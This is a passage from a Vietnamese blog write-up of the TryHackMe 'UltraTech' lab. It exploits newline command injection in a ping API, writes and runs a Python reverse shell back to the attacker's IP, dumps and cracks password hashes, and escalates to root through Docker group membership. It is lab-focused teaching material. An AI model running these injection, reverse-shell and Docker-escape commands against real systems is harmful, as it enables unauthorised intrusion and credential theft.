+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0anc</span><br><span class="line"></span><br><span class="line">usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]</span><br><span class="line">[-m minttl] [-O length] [-P proxy_username] [-p source_port]</span><br><span class="line">[-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]</span><br><span class="line">[-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]</span><br></pre></td></tr></table></figure>
+<p>Thấy là netcat ở đây không có option -e, tìm cách khác, xem xem có python, perl, rubi các thứ không…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0apython --version</span><br><span class="line"></span><br><span class="line">Python 2.7.15rc1</span><br><span class="line"></span><br><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0apython3 --version</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes</span><br><span class="line">64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.016 ms</span><br><span class="line"></span><br><span class="line">--- localhost ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms</span><br><span class="line">Python 3.6.7</span><br></pre></td></tr></table></figure>
+<p>Ngon ngay, cả Python 2 và Python 3 đủ cả. Giờ thì tạo reverse shell ez game.<br>Do server lọc dấu “;”, nên tôi phải dùng “\n” để thay thế, sẽ không cần option -e của echo để chuyển “\n” thành ký tự ngắt dòng do URL decode của server tự làm việc đó rồi.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0aecho &#x27;import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;10.9.226.195&quot;,4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn(&quot;/bin/bash&quot;)&#x27; &gt; shell.py</span><br><span class="line"></span><br><span class="line">http://10.10.3.122:8081/ping?ip=localhost%0acat shell.py</span><br><span class="line"></span><br><span class="line">PING localhost(localhost6.localdomain6 (::1)) 56 data bytes</span><br><span class="line">64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.017 ms</span><br><span class="line"></span><br><span class="line">--- localhost ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms</span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;10.9.226.195&quot;,4444))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<p>Đoạn script trông ổn đấy &#x3D;)) Giờ chạy nó và lấy shell thôi.</p>
+<h2 id="Get-User-Shell"><a href="#Get-User-Shell" class="headerlink" title="Get User Shell"></a>Get User Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 4444                    </span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.3.122 50918</span><br><span class="line">www@ultratech-prod:~/api$ id</span><br><span class="line">uid=1002(www) gid=1002(www) groups=1002(www)</span><br><span class="line"></span><br><span class="line">www@ultratech-prod:~/api$ ls -al</span><br><span class="line">total 80</span><br><span class="line">drwxr-xr-x   3 www www  4096 Jan 25 15:39 .</span><br><span class="line">drwxr-xr-x   5 www www  4096 Mar 22  2019 ..</span><br><span class="line">-rw-r--r--   1 www www  1750 Mar 22  2019 index.js</span><br><span class="line">drwxrwxr-x 163 www www  4096 Mar 22  2019 node_modules</span><br><span class="line">-rw-r--r--   1 www www   370 Mar 22  2019 package.json</span><br><span class="line">-rw-r--r--   1 www www 42702 Mar 22  2019 package-lock.json</span><br><span class="line">-rw-rw-r--   1 www www   212 Jan 25 15:39 shell.py</span><br><span class="line">-rw-rw-r--   1 www www   103 Mar 22  2019 start.sh</span><br><span class="line">-rw-r--r--   1 www www  8192 Mar 22  2019 utech.db.sqlite</span><br><span class="line"></span><br><span class="line">www@ultratech-prod:~/api$ cat utech.db.sqlite</span><br><span class="line">zz��etableusersusersCREATE TABLE users (</span><br><span class="line">            login Varchar,</span><br><span class="line">            password Varchar,</span><br><span class="line">            type Int</span><br><span class="line">���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84www@ultratech-prod:~/api$ </span><br></pre></td></tr></table></figure>
+<p>Game dễ!<br>Tách username với hash password ra, ném hash đấy lên CrackStation xem có được việc gì không.<br><img src="/2021/01/25/ultratech1-tryhackme/pic3.png"><br>r00t:n100906<br>admin:mrsheafy</p>
+<h2 id="Get-Root-Shell"><a href="#Get-Root-Shell" class="headerlink" title="Get Root Shell"></a>Get Root Shell</h2><p>Chả biết thằng admin kia là ai, chỉ thấy thằng r00t có tên trong &#x2F;etc&#x2F;passwd, đăng nhập vào nó ngay và luôn.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www@ultratech-prod:~/api$ su r00t</span><br><span class="line">Password: n100906</span><br><span class="line"></span><br><span class="line">r00t@ultratech-prod:/home/www/api$ id</span><br><span class="line">uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)</span><br></pre></td></tr></table></figure>
+<p>Ối giời ơi! Docker!<br>Kèo này có vẻ leo lên quyền root dễ thở rồi. root chứ không phải r00t nhé :&#x2F;<br>Với Docker thì ngon lành rồi, xem có image nào không, rồi mount nó vào thư mục hệ thống, done!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r00t@ultratech-prod:~$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">bash                latest              495d6437fc1e        22 months ago       15.8MB</span><br><span class="line">r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/medium/" rel="tag"># medium</a>
+              <a href="/tags/tryhackme/" rel="tag"># tryhackme</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/29/C0m801-vulnhub/" rel="prev" title="[VulnHub] C0m80 1">
+                  <i class="fa fa-angle-left"></i> [VulnHub] C0m80 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/" rel="next" title="[AttackDefense] Privilege Escalation: CTF [Oct 16-20]">
+                  [AttackDefense] Privilege Escalation: CTF [Oct 16-20] <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
